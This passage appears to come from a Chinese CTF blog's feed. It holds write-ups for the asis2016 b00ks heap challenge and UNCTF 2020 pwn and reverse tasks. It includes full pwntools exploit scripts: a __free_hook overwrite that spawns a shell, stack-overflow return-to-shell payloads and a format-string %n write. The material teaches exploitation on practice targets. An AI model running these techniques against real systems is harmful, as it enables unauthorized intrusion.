class="number">9</span>: warning: format ‘%X’ expects argument of type ‘<span class="keyword">unsigned</span> <span class="keyword">int</span>’, but argument <span class="number">2</span> has type ‘<span class="keyword">void</span> (*)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)’ [-Wformat=]</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;__free_hook: 0x%016X\n&quot;</span>,__free_hook);</span><br><span class="line">         ^</span><br><span class="line">demo.c:<span class="number">14</span>:<span class="number">14</span>: warning: assignment from incompatible pointer type [-Wincompatible-pointer-types]</span><br><span class="line">  __free_hook = system;</span><br><span class="line">              ^</span><br><span class="line">ex@ubuntu:~/test$ ./demo </span><br><span class="line">__free_hook: <span class="number">0x0000000000000000</span></span><br><span class="line">$ echo hello world</span><br><span class="line">hello world</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>以上代码节选自<a href="http://blog.eonew.cn/archives/521">http://blog.eonew.cn/archives/521</a></li></ol><p>再简单一句话概括：__free_hook执行时会把chunk中的用户数据作为参数。<br>所以挟持的步骤：</p><ol><li>把__free_hook的地址改为system地址</li><li>把待free的chunk中的内容改为’/bin/sh’</li><li>执行free(之前修改的chunk)</li></ol><p>已经得到解题的所有步骤了，那么执行shell的步骤如下：</p><ol><li>通过libc基地址得到freehook地址，system地址，binsh地址</li><li>由于之前已经将fakebook的description所指向的地址改为book2的name地址，所以可以通过修改book1的description来修改book2的name指针，和description指针所指向的内容。因此我们可以把book2的name改为’/bin/sh’把它的description改为’__free_hook’的地址。</li><li>通过步骤2，我们已经把book2的description所指向的地址改成了__free_hook，因此此时修改book2的description就是修改__free_hook的地址，因此此时只要修改book2的description为system的地址。</li><li>free(book2)  <code>pwn!!!!!!!!!!</code> </li></ol><blockquote><p>这里有一个细节<img src="https://img-blog.csdnimg.cn/202012021817592.png" alt="在这里插入图片描述"><br>在delete操作中，它会把每个chunk都free一遍，所以实际上是它在free(book2的name)的时候获取了shell。（之前纠结了很久__free_hook究竟会调用哪个作为参数）</p></blockquote><h2 id="0x03-脚本"><a href="#0x03-脚本" class="headerlink" title="0x03 脚本"></a>0x03 脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwnlib</span><br><span class="line"> </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,26090)</span></span><br><span class="line">p = process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size, name, desc_size, desc</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(desc_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">book_id</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">book_id, desc</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_id))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printf</span>():</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author</span>(<span class="params">author</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    p.sendline(author)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">book1_name = <span class="number">0x40</span></span><br><span class="line">book1_des = <span class="number">0x20</span></span><br><span class="line">create(book1_name, <span class="string">&#x27;a&#x27;</span>, book1_des, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">printf()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ID: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">book1_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;book1_addr:&quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">1</span>)+p64(book1_addr+<span class="number">0x38</span>)+p64(book1_addr+<span class="number">0x38</span>)+p64(<span class="number">0xffff</span>))</span><br><span class="line">change_author(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">printf()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;ID: 1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">book2_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;book2_addr:&quot;</span>+<span class="built_in">hex</span>(book2_addr))</span><br><span class="line">libc_base = book2_addr + (<span class="number">0x7f1b0ac89000</span> - <span class="number">0x7f1b0ac42010</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc base:&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">elf_base = libc_base + libc.sym[<span class="string">&#x27;free&#x27;</span>] - elf.plt[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">free_hook = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + libc_base</span><br><span class="line">binsh_addr = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>() + libc_base</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;free_hook = &quot;</span>+ <span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system = &quot;</span>+ <span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh_addr = &quot;</span>+ <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>虽然明白了打法，但是我还是花了很久的时间去把这题打穿。因为不同的解释器他们的offset大小都不一样，我用了我三台不同版本的ubuntu虚拟机偏移量都不对，可能是因为这个题目太老了，最后采用了网上别人打穿的wp的偏移量。然后本地的libc版本也很重要，不然就算获取了基地址，根据偏移量算出的函数地址也都是不对的。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;堆入门-off-by-null-asis2016-b00ks&quot;&gt;&lt;a href=&quot;#堆入门-off-by-null-asis2016-b00ks&quot; class=&quot;headerlink&quot; title=&quot;[堆入门 off-by-null] asis2016_b00ks</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
    <category term="heap" scheme="http://blog.k0nashi.cn/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF PWN方向</title>
    <link href="http://blog.k0nashi.cn/2020/11/18/PWN%E6%96%B9%E5%90%91/"/>
    <id>http://blog.k0nashi.cn/2020/11/18/PWN%E6%96%B9%E5%90%91/</id>
    <published>2020-11-18T08:23:52.000Z</published>
    <updated>2023-04-03T06:59:19.713Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UNCTF-2020-PWN方向"><a href="#UNCTF-2020-PWN方向" class="headerlink" title="[UNCTF 2020] PWN方向"></a>[UNCTF 2020] PWN方向</h1><h2 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h2><p><img src="https://img-blog.csdnimg.cn/20201113132633540.png#pic_center" alt="在这里插入图片描述"><br>直接在linux使用指令nc 45.158.33.12 8000<br><img src="https://img-blog.csdnimg.cn/2020111313291312.png#pic_center" alt="在这里插入图片描述"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;45.158.33.12&#x27;</span>,<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;chcp 65001&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure><p>运行脚本得到flag<br><img src="https://img-blog.csdnimg.cn/20201113133003471.png#pic_center" alt="在这里插入图片描述"></p><h2 id="fan"><a href="#fan" class="headerlink" title="fan"></a>fan</h2><p><img src="https://img-blog.csdnimg.cn/20201113133223169.png#pic_center" alt="在这里插入图片描述"><br>明显的栈溢出<br><img src="https://img-blog.csdnimg.cn/20201113133249779.png#pic_center" alt="在这里插入图片描述"><br>binsh+system地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">49408</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x400739</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x30</span> + <span class="number">8</span>) + p64(binsh)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201113133605844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="do-you-like-me"><a href="#do-you-like-me" class="headerlink" title="do_you_like_me?"></a>do_you_like_me?</h2><p><img src="https://img-blog.csdnimg.cn/2020111313370458.png#pic_center" alt="在这里插入图片描述"><br>同上题，明显的栈溢出<br><img src="https://img-blog.csdnimg.cn/20201113133727820.png#pic_center" alt="在这里插入图片描述"><br>binsh+system地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">41043</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x4006D1</span> </span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * (<span class="number">0x10</span> + <span class="number">8</span>) + p64(binsh)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201113133915342.png#pic_center" alt="在这里插入图片描述"></p><h2 id="你真的会pwn嘛？（-格式化字符串漏洞）"><a href="#你真的会pwn嘛？（-格式化字符串漏洞）" class="headerlink" title="你真的会pwn嘛？（*格式化字符串漏洞）"></a>你真的会pwn嘛？（*格式化字符串漏洞）</h2><h3 id="0x00-逆向分析"><a href="#0x00-逆向分析" class="headerlink" title="0x00 逆向分析"></a>0x00 逆向分析</h3><p><img src="https://img-blog.csdnimg.cn/20201113134019441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201113134035510.png#pic_center" alt="在这里插入图片描述"><br>只要dword_60107c不为0即可得到shell<br>运用格式化字符串漏洞%n即可修改dword_60107c</p><h3 id="0x01-获取偏移量"><a href="#0x01-获取偏移量" class="headerlink" title="0x01 获取偏移量"></a>0x01 获取偏移量</h3><p><img src="https://img-blog.csdnimg.cn/20201113134620283.png#pic_center" alt="在这里插入图片描述"><br>可以看到输入的8个A在第十个变量，所以偏移量为10。</p><h3 id="0x02-脚本"><a href="#0x02-脚本" class="headerlink" title="0x02 脚本"></a>0x02 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node2.hackingfor.fun&#x27;</span>,<span class="number">46560</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn22&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dword_60107C = <span class="number">0x60107C</span></span><br><span class="line">payload = <span class="string">&#x27;...%11$n&#x27;</span> + p64(dword_60107C)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#偏移量10</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201113134739826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这个payload有三个注意点：<br>1.printf有\x00截断，即碰到\x00就会停止读入，所以如果把dword的地址放在<code>%11$n</code>之前，由于地址中存在\x00字符，所以会导致读取时碰到\x00而读不到%11$n就结束了。因此要把<code>%11$n</code>放在前面</p><ol start="2"><li><code>%11$n</code>只会把它之前输出的字符数量写到指定地址里，之后的不行。payload中的<code>...%11$n</code> 改为<code>%11$n...</code> 则写进去的是0，因为在它之前没有输出字符。上图中虽然输出了<code>...|\x10</code>但是真正写进去的只有<code>...</code>，也就是3。</li><li>为了让printf认为dword的地址是要写进去的地址，一定要让它的地址刚好占一个机器字长。所以在这之前的 <code>%11$n</code>一定要用<code>...</code>补齐8个字符（当然不用<code>.</code>用别的字符也是可以的）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;UNCTF-2020-PWN方向&quot;&gt;&lt;a href=&quot;#UNCTF-2020-PWN方向&quot; class=&quot;headerlink&quot; title=&quot;[UNCTF 2020] PWN方向&quot;&gt;&lt;/a&gt;[UNCTF 2020] PWN方向&lt;/h1&gt;&lt;h2 id=&quot;YLBNB</summary>
      
    
    
    
    <category term="UNCTF2020" scheme="http://blog.k0nashi.cn/categories/UNCTF2020/"/>
    
    
    <category term="UNCTF" scheme="http://blog.k0nashi.cn/tags/UNCTF/"/>
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>UNCTF Reverse方向</title>
    <link href="http://blog.k0nashi.cn/2020/11/18/UNCTF-Reverse%E6%96%B9%E5%90%91/"/>
    <id>http://blog.k0nashi.cn/2020/11/18/UNCTF-Reverse%E6%96%B9%E5%90%91/</id>
    <published>2020-11-18T08:23:52.000Z</published>
    <updated>2023-04-03T06:59:54.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UNCTF-2020-Reverse方向"><a href="#UNCTF-2020-Reverse方向" class="headerlink" title="[UNCTF 2020]Reverse方向"></a>[UNCTF 2020]Reverse方向</h1><h2 id="re-checkin"><a href="#re-checkin" class="headerlink" title="re_checkin"></a>re_checkin</h2><h3 id="0x00-逆向分析"><a href="#0x00-逆向分析" class="headerlink" title="0x00 逆向分析"></a>0x00 逆向分析</h3><p><img src="https://img-blog.csdnimg.cn/20201107180246452.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>一个简单的字符串比较</p><h3 id="0x01-动态调试"><a href="#0x01-动态调试" class="headerlink" title="0x01 动态调试"></a>0x01 动态调试</h3><p><img src="https://img-blog.csdnimg.cn/2020110718045686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>上个断点，本地windows调试<br><img src="https://img-blog.csdnimg.cn/20201107180536915.png#pic_center" alt="在这里插入图片描述"><br>随便输入点东西<br><img src="https://img-blog.csdnimg.cn/20201107180558269.png#pic_center" alt="在这里插入图片描述"><br>双击Str2，选中第一个按一下A，flag就出来了<br><img src="https://img-blog.csdnimg.cn/20201107180620482.png#pic_center" alt="在这里插入图片描述"></p><h2 id="babypy"><a href="#babypy" class="headerlink" title="babypy"></a>babypy</h2><h3 id="0x00-下载文件"><a href="#0x00-下载文件" class="headerlink" title="0x00 下载文件"></a>0x00 下载文件</h3><p><img src="https://img-blog.csdnimg.cn/20201107162813571.png#pic_center" alt="在这里插入图片描述"><br>下载完解压发现是一个exe文件和一个txt文件<br><img src="https://img-blog.csdnimg.cn/20201107162831421.png#pic_center" alt="在这里插入图片描述">txt是不明加密结果，一堆0 1 3组成的数。<br>exe打不开，不知是什么东西。</p><h3 id="0x01-反编译"><a href="#0x01-反编译" class="headerlink" title="0x01 反编译"></a>0x01 反编译</h3><p>百度查到，这个exe文件是pyc文件捆绑编译。需要使用pyinstxtractor脚本工具。<br>贴一下连接：<a href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a><br>用法：把pyinstxtractor.py放到exe同目录文件夹下<br>在该文件夹下打开cmd<br>输入python2 pyinstxtractor.py babypy.exe<br>（注：我电脑是python2 3共存，如只有一个python则python2改为python即可）<br>然后会得到一个文件夹<br><img src="https://img-blog.csdnimg.cn/20201107163250757.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201107163258173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>文件夹里就是py的编译文件pyc了。<br>pyc编译成py文件需要uncompyle6（百度安装）<br>但是反编译发生了报错<br><img src="https://img-blog.csdnimg.cn/20201107163453547.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center"><br>百度发现pyinstxtractor在反编译exe文件后，会删除pyc文件的前8位信息。<br>解决方法是在pyc文件前加上struct文件的前8位。<br>我试过了，莫得用。<br>可能是我用的pyinstxtractor版本问题，它似乎给所有pyc文件自动补上了8位文件头，但是貌似不太正确。<br>于是我尝试着用struct文件的前8位去覆盖pyc文件的前8位。成功了。</p><p>以下界面使用软件010Editor<br>struct.pyc的文件头：<img src="https://img-blog.csdnimg.cn/20201107163937279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>babypy.pyc的文件头<br><img src="https://img-blog.csdnimg.cn/20201107163946152.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用struct前8位覆盖babypy的前8位以后的babypy<br><img src="https://img-blog.csdnimg.cn/20201107164109527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201107164131229.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201107164154463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到反编译出的babypy.py</p><h3 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.7 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.10 (default, May 23 2015, 09:44:00) [MSC v.1500 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Warning: this version of Python has problems handling the Python 3 &quot;byte&quot; type in constants properly.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Embedded file name: babypy.py</span></span><br><span class="line"><span class="keyword">import</span> os, libnum, binascii</span><br><span class="line">flag = <span class="string">&#x27;unctf&#123;*******************&#125;&#x27;</span></span><br><span class="line">x = libnum.s2n(flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">x</span>):</span></span><br><span class="line">    y = <span class="built_in">abs</span>(x)</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> y &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">yield</span> y % <span class="number">2</span></span><br><span class="line">            y = y &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">yield</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">l = [i <span class="keyword">for</span> i <span class="keyword">in</span> gen(x)]</span><br><span class="line">l.reverse()</span><br><span class="line">f = <span class="string">&#x27;%d&#x27;</span> * <span class="built_in">len</span>(l) % <span class="built_in">tuple</span>(l)</span><br><span class="line">a = binascii.b2a_hex(f.encode())</span><br><span class="line">b = <span class="built_in">int</span>(a, <span class="number">16</span>)</span><br><span class="line">c = <span class="built_in">hex</span>(b)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">os.system(<span class="string">&#x27;pause&#x27;</span>)</span><br><span class="line"><span class="comment"># okay decompiling 